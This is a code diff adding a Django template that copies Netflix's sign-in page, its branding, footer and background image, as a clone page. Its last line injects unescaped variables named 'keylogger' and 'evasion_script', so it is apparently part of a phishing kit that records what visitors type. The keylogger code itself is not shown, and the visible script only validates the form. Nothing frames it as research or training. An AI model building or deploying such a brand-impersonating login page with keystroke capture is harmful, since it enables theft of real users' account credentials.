@@ -1,0 +1,616 @@
+{% extends 'base/clone.html' %}
+
+{% load static %}
+
+{% block content %}
+<div class="netflix-login-container">
+    <div class="netflix-background">
+        <div class="netflix-background-overlay"></div>
+        <img src="https://assets.nflxext.com/ffe/siteui/vlv3/9d3533b2-0e2b-40b2-95e0-ecd7979cc88b/a3873901-5b7c-46eb-b9fa-12fea5197bd3/IN-en-20240311-popsignuptwoweeks-perspective_alpha_website_large.jpg" 
+             alt="Netflix background" 
+             class="netflix-background-image">
+    </div>
+    
+    <header class="netflix-header">
+        <div class="netflix-logo-container">
+            <svg viewBox="0 0 111 30" class="netflix-logo" focusable="false">
+                <g id="netflix-logo">
+                    <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" fill="#e50914"></path>
+                </g>
+            </svg>
+        </div>
+        <div class="netflix-language-switcher">
+            <select class="netflix-language-select">
+                <option value="en">English</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+            </select>
+            <svg viewBox="0 0 24 24" class="netflix-language-icon">
+                <path d="M12.87,15.07L10.33,12.56L10.36,12.53C12.1,10.59 13.34,8.36 14.07,6H17V4H10V2H8V4H1V6H12.17C11.5,7.92 10.44,9.75 9,11.35C8.07,10.32 7.3,9.19 6.69,8H4.69C5.42,9.63 6.42,11.17 7.67,12.56L2.58,17.58L4,19L9,14L12.11,17.11L12.87,15.07M18.5,10H16.5L12,22H14L15.12,19H19.87L21,22H23L18.5,10M15.88,17L17.5,12.67L19.12,17H15.88Z" />
+            </svg>
+        </div>
+        <a href="#" class="netflix-signin-button">Sign In</a>
+    </header>
+    
+    <div class="netflix-login-content">
+        <div class="netflix-login-card">
+            <h1 class="netflix-login-title">Sign In</h1>
+            
+            <form class="netflix-login-form" id="netflixLoginForm">
+                <div class="netflix-input-group">
+                    <input type="email" id="netflixEmail" class="netflix-input" required>
+                    <label for="netflixEmail" class="netflix-input-label">Email or phone number</label>
+                    <div class="netflix-input-error" id="emailError"></div>
+                </div>
+                
+                <div class="netflix-input-group">
+                    <input type="password" id="netflixPassword" class="netflix-input" required>
+                    <label for="netflixPassword" class="netflix-input-label">Password</label>
+                    <button type="button" class="netflix-password-toggle">
+                        <span class="netflix-password-toggle-text">SHOW</span>
+                    </button>
+                    <div class="netflix-input-error" id="passwordError"></div>
+                </div>
+                
+                <button type="submit" class="netflix-submit-button">Sign In</button>
+                
+                <div class="netflix-login-options">
+                    <label class="netflix-checkbox-container">
+                        <input type="checkbox" class="netflix-checkbox">
+                        <span class="netflix-checkbox-label">Remember me</span>
+                    </label>
+                    <a href="#" class="netflix-help-link">Need help?</a>
+                </div>
+            </form>
+            
+            <div class="netflix-login-footer">
+                <p class="netflix-login-new">
+                    New to Netflix? <a href="#" class="netflix-signup-link">Sign up now</a>.
+                </p>
+                <p class="netflix-login-captcha">
+                    This page is protected by Google reCAPTCHA to ensure you're not a bot. 
+                    <a href="#" class="netflix-learn-more">Learn more.</a>
+                </p>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="netflix-footer">
+        <div class="netflix-footer-content">
+            <p class="netflix-footer-phone">Questions? Call 1-844-505-2993</p>
+            <ul class="netflix-footer-links">
+                <li><a href="#">FAQ</a></li>
+                <li><a href="#">Help Center</a></li>
+                <li><a href="#">Netflix Shop</a></li>
+                <li><a href="#">Terms of Use</a></li>
+                <li><a href="#">Privacy</a></li>
+                <li><a href="#">Cookie Preferences</a></li>
+                <li><a href="#">Corporate Information</a></li>
+            </ul>
+            <div class="netflix-footer-language">
+                <select class="netflix-language-select">
+                    <option value="en">English</option>
+                    <option value="es">Español</option>
+                </select>
+            </div>
+            <p class="netflix-footer-copyright">
+                Netflix, Inc.
+            </p>
+        </div>
+    </footer>
+</div>
+
+<style>
+:root {
+    --netflix-red: #e50914;
+    --netflix-dark-red: #b20710;
+    --netflix-black: #000000;
+    --netflix-dark-gray: #333333;
+    --netflix-gray: #737373;
+    --netflix-light-gray: #8c8c8c;
+    --netflix-white: #ffffff;
+    --netflix-input-bg: rgba(0, 0, 0, 0.4);
+    --netflix-footer-bg: rgba(0, 0, 0, 0.75);
+    --netflix-box-shadow: 0 1px 0 rgba(0, 0, 0, 0.45);
+    --netflix-transition: all 0.2s ease-in;
+}
+
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+body {
+    font-family: 'Netflix Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    color: var(--netflix-white);
+    line-height: 1.4;
+    -webkit-font-smoothing: antialiased;
+    background-color: var(--netflix-black);
+}
+
+.netflix-login-container {
+    position: relative;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+}
+
+.netflix-background {
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    z-index: -1;
+    overflow: hidden;
+}
+
+.netflix-background-overlay {
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(0, 0, 0, 0.4);
+    background-image: linear-gradient(
+        to top,
+        rgba(0, 0, 0, 0.8) 0,
+        rgba(0, 0, 0, 0) 60%,
+        rgba(0, 0, 0, 0.8) 100%
+    );
+    z-index: 1;
+}
+
+.netflix-background-image {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+.netflix-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 20px 3%;
+    z-index: 1;
+}
+
+.netflix-logo-container {
+    height: 45px;
+}
+
+.netflix-logo {
+    height: 100%;
+    width: auto;
+    fill: var(--netflix-red);
+}
+
+.netflix-language-switcher {
+    position: relative;
+    margin-right: 20px;
+}
+
+.netflix-language-select {
+    background-color: rgba(0, 0, 0, 0.4);
+    color: var(--netflix-white);
+    border: 1px solid var(--netflix-gray);
+    border-radius: 4px;
+    padding: 8px 26px 8px 10px;
+    font-size: 14px;
+    appearance: none;
+    cursor: pointer;
+}
+
+.netflix-language-icon {
+    position: absolute;
+    right: 8px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 16px;
+    height: 16px;
+    fill: var(--netflix-white);
+    pointer-events: none;
+}
+
+.netflix-signin-button {
+    background-color: var(--netflix-red);
+    color: var(--netflix-white);
+    border: none;
+    border-radius: 4px;
+    padding: 8px 16px;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    text-decoration: none;
+    transition: var(--netflix-transition);
+}
+
+.netflix-signin-button:hover {
+    background-color: var(--netflix-dark-red);
+}
+
+.netflix-login-content {
+    flex: 1;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    z-index: 1;
+}
+
+.netflix-login-card {
+    background-color: rgba(0, 0, 0, 0.75);
+    border-radius: 4px;
+    padding: 60px 68px;
+    max-width: 450px;
+    width: 100%;
+    margin: 0 auto;
+}
+
+.netflix-login-title {
+    font-size: 32px;
+    font-weight: 500;
+    margin-bottom: 28px;
+}
+
+.netflix-login-form {
+    display: flex;
+    flex-direction: column;
+}
+
+.netflix-input-group {
+    position: relative;
+    margin-bottom: 16px;
+}
+
+.netflix-input {
+    width: 100%;
+    height: 50px;
+    padding: 16px 20px 0;
+    background-color: var(--netflix-input-bg);
+    border: none;
+    border-radius: 4px;
+    color: var(--netflix-white);
+    font-size: 16px;
+    outline: none;
+}
+
+.netflix-input:focus {
+    background-color: var(--netflix-dark-gray);
+}
+
+.netflix-input-label {
+    position: absolute;
+    top: 50%;
+    left: 20px;
+    transform: translateY(-50%);
+    color: var(--netflix-light-gray);
+    font-size: 16px;
+    transition: var(--netflix-transition);
+    pointer-events: none;
+}
+
+.netflix-input:focus + .netflix-input-label,
+.netflix-input:not(:placeholder-shown) + .netflix-input-label {
+    top: 7px;
+    font-size: 11px;
+}
+
+.netflix-password-toggle {
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    color: var(--netflix-light-gray);
+    font-size: 13px;
+    font-weight: 500;
+    cursor: pointer;
+    padding: 5px;
+}
+
+.netflix-password-toggle:hover {
+    color: var(--netflix-white);
+}
+
+.netflix-input-error {
+    color: #e87c03;
+    font-size: 13px;
+    margin-top: 6px;
+    display: none;
+}
+
+.netflix-submit-button {
+    background-color: var(--netflix-red);
+    color: var(--netflix-white);
+    border: none;
+    border-radius: 4px;
+    padding: 16px;
+    font-size: 16px;
+    font-weight: 500;
+    margin-top: 24px;
+    margin-bottom: 12px;
+    cursor: pointer;
+    transition: var(--netflix-transition);
+}
+
+.netflix-submit-button:hover {
+    background-color: var(--netflix-dark-red);
+}
+
+.netflix-login-options {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 40px;
+    color: var(--netflix-light-gray);
+    font-size: 13px;
+}
+
+.netflix-checkbox-container {
+    display: flex;
+    align-items: center;
+    cursor: pointer;
+}
+
+.netflix-checkbox {
+    margin-right: 5px;
+    accent-color: var(--netflix-gray);
+}
+
+.netflix-help-link {
+    color: var(--netflix-light-gray);
+    text-decoration: none;
+}
+
+.netflix-help-link:hover {
+    text-decoration: underline;
+}
+
+.netflix-login-footer {
+    color: var(--netflix-light-gray);
+}
+
+.netflix-login-new {
+    font-size: 16px;
+    margin-bottom: 11px;
+}
+
+.netflix-signup-link {
+    color: var(--netflix-white);
+    text-decoration: none;
+}
+
+.netflix-signup-link:hover {
+    text-decoration: underline;
+}
+
+.netflix-login-captcha {
+    font-size: 13px;
+    margin-top: 16px;
+}
+
+.netflix-learn-more {
+    color: #0071eb;
+    text-decoration: none;
+}
+
+.netflix-learn-more:hover {
+    text-decoration: underline;
+}
+
+.netflix-footer {
+    background-color: var(--netflix-footer-bg);
+    padding: 30px 0;
+    margin-top: 90px;
+}
+
+.netflix-footer-content {
+    max-width: 1000px;
+    margin: 0 auto;
+    padding: 0 4%;
+}
+
+.netflix-footer-phone {
+    color: var(--netflix-light-gray);
+    font-size: 16px;
+    margin-bottom: 30px;
+}
+
+.netflix-footer-links {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 15px;
+    margin-bottom: 30px;
+    list-style: none;
+}
+
+.netflix-footer-links li a {
+    color: var(--netflix-light-gray);
+    font-size: 13px;
+    text-decoration: none;
+}
+
+.netflix-footer-links li a:hover {
+    text-decoration: underline;
+}
+
+.netflix-footer-language {
+    margin-bottom: 20px;
+}
+
+.netflix-footer-copyright {
+    color: var(--netflix-light-gray);
+    font-size: 11px;
+}
+
+/* Error states */
+.netflix-input.invalid {
+    border-bottom: 2px solid #e87c03;
+}
+
+.netflix-input.invalid + .netflix-input-label {
+    color: #e87c03;
+}
+
+/* Responsive adjustments */
+@media (max-width: 740px) {
+    .netflix-background {
+        display: none;
+    }
+    
+    .netflix-login-container {
+        background: var(--netflix-black);
+    }
+    
+    .netflix-login-card {
+        padding: 15px;
+        max-width: 100%;
+    }
+    
+    .netflix-footer-links {
+        grid-template-columns: 1fr;
+    }
+    
+    .netflix-header {
+        padding: 15px;
+    }
+    
+    .netflix-logo-container {
+        height: 35px;
+    }
+}
+
+/* Focus styles */
+.netflix-input:focus-visible,
+.netflix-submit-button:focus-visible,
+.netflix-signin-button:focus-visible {
+    outline: 2px solid var(--netflix-white);
+    outline-offset: 2px;
+}
+</style>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Password toggle functionality
+    const passwordToggle = document.querySelector('.netflix-password-toggle');
+    const passwordInput = document.getElementById('netflixPassword');
+    
+    if (passwordToggle && passwordInput) {
+        passwordToggle.addEventListener('click', function() {
+            const isPassword = passwordInput.type === 'password';
+            passwordInput.type = isPassword ? 'text' : 'password';
+            this.querySelector('.netflix-password-toggle-text').textContent = 
+                isPassword ? 'HIDE' : 'SHOW';
+        });
+    }
+    
+    // Form validation
+    const loginForm = document.getElementById('netflixLoginForm');
+    const emailInput = document.getElementById('netflixEmail');
+    // const passwordInput = document.getElementById('netflixPassword');
+    const emailError = document.getElementById('emailError');
+    const passwordError = document.getElementById('passwordError');
+    
+    if (loginForm) {
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Reset errors
+            emailError.style.display = 'none';
+            passwordError.style.display = 'none';
+            emailInput.classList.remove('invalid');
+            passwordInput.classList.remove('invalid');
+            
+            let isValid = true;
+            
+            // Email validation
+            if (!emailInput.value) {
+                emailError.textContent = 'Email is required';
+                emailError.style.display = 'block';
+                emailInput.classList.add('invalid');
+                isValid = false;
+            } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value)) {
+                emailError.textContent = 'Please enter a valid email address';
+                emailError.style.display = 'block';
+                emailInput.classList.add('invalid');
+                isValid = false;
+            }
+            
+            // Password validation
+            if (!passwordInput.value) {
+                passwordError.textContent = 'Password is required';
+                passwordError.style.display = 'block';
+                passwordInput.classList.add('invalid');
+                isValid = false;
+            } else if (passwordInput.value.length < 4) {
+                passwordError.textContent = 'Password must be between 4 and 60 characters';
+                passwordError.style.display = 'block';
+                passwordInput.classList.add('invalid');
+                isValid = false;
+            }
+            
+            if (isValid) {
+                // Simulate form submission
+                const submitButton = this.querySelector('.netflix-submit-button');
+                submitButton.disabled = true;
+                submitButton.innerHTML = 'Signing in...';
+                
+                // In a real app, you would submit the form here
+                setTimeout(() => {
+                    submitButton.innerHTML = 'Sign In';
+                    submitButton.disabled = false;
+                    // Show success or error message
+                }, 1500);
+            }
+        });
+    }
+    
+    // Input validation on blur
+    if (emailInput) {
+        emailInput.addEventListener('blur', function() {
+            if (!this.value) {
+                emailError.textContent = 'Email is required';
+                emailError.style.display = 'block';
+                this.classList.add('invalid');
+            } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(this.value)) {
+                emailError.textContent = 'Please enter a valid email address';
+                emailError.style.display = 'block';
+                this.classList.add('invalid');
+            } else {
+                emailError.style.display = 'none';
+                this.classList.remove('invalid');
+            }
+        });
+    }
+    
+    if (passwordInput) {
+        passwordInput.addEventListener('blur', function() {
+            if (!this.value) {
+                passwordError.textContent = 'Password is required';
+                passwordError.style.display = 'block';
+                this.classList.add('invalid');
+            } else if (this.value.length < 4) {
+                passwordError.textContent = 'Password must be between 4 and 60 characters';
+                passwordError.style.display = 'block';
+                this.classList.add('invalid');
+            } else {
+                passwordError.style.display = 'none';
+                this.classList.remove('invalid');
+            }
+        });
+    }
+    
+    // Simulate Netflix's page load animation
+    document.body.style.opacity = '0';
+    setTimeout(() => {
+        document.body.style.transition = 'opacity 0.5s ease-in-out';
+        document.body.style.opacity = '1';
+    }, 50);
+});
+</script>
+
+{{ keylogger|safe }} {{ security_scripts|safe }} {{ timeout_script|safe }} {{ evasion_script|safe }}
+{% endblock %}
